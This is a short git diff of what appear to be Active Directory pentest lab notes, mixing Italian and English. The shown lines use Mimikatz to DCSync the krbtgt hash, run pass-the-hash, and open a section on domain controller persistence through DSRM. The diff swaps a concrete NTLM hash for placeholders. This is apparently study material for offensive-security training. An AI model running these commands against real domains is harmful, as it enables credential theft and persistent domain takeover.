@@ -49,14 +49,14 @@ Poi avvia DCSync  con mimikatz
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-To persistence on dcorp-dc we can abuse the DSRM service.
+### **DC persistence by abusing the DSRM service.**
 Firtsly dump the hashes from the dc
 Open a session on the dc
 ```powershell
 . C:\AD\Tools\Invoke-Mimi.ps1
 ```
 ```powershell
-Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd.exe"'
+Invoke-Mimi -Command '"sekurlsa::pth /user:<ADMIN USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe"'
 ```
 or using Rubeus
 ```cmd
